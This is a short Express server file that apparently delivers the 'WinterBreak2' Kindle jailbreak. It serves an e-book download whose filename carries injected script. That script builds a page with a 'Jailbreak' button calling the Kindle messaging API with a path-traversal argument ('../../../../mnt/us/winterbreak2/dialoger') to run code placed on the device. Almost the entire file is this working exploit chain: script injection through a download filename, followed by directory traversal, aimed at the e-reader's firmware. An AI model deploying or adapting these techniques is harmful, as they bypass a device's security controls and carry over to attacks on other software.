/*
    WinterBreak2
    Discovered By Scam.Net

    Written By Penguins184
*/

import express from "express";
import path from "path";
const app = express();

app.get("/", (req, res) => {
    const fPath = path.join(path.join(process.cwd(), "assets"), "placeholder.mobi");
    const fName = `<script>document.write("<html><body><style>* { margin: 0px } h1, p { font-family: arial, sans-serif, helvetica } button { padding: 15px 15px 15px 15px }</style><h1>Winterbreak2</h1><br><p>By Scam.Net, Penguins184</p><br><button onclick='(window.kindle || top.kindle).messaging.sendMessage(\"com.lab126.pillow\", \"customDialog\", { name: \"../../../../mnt/us/winterbreak2/dialoger\" })'>Jailbreak</button></body></html>")</script>.mobi`; //Dialog Code

    res.set({
        "Content-Type": "application/x-mobipocket-ebook",
        "Content-Disposition": `attachment; filename=${fName}`
    })

    res.sendFile(fPath, (err) => {
        if (err) {
            console.error("Download Error:", err);
            res.status(500).send("Download Failed.");
        };
    });
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listening On ${PORT}!`);
});

export default app;


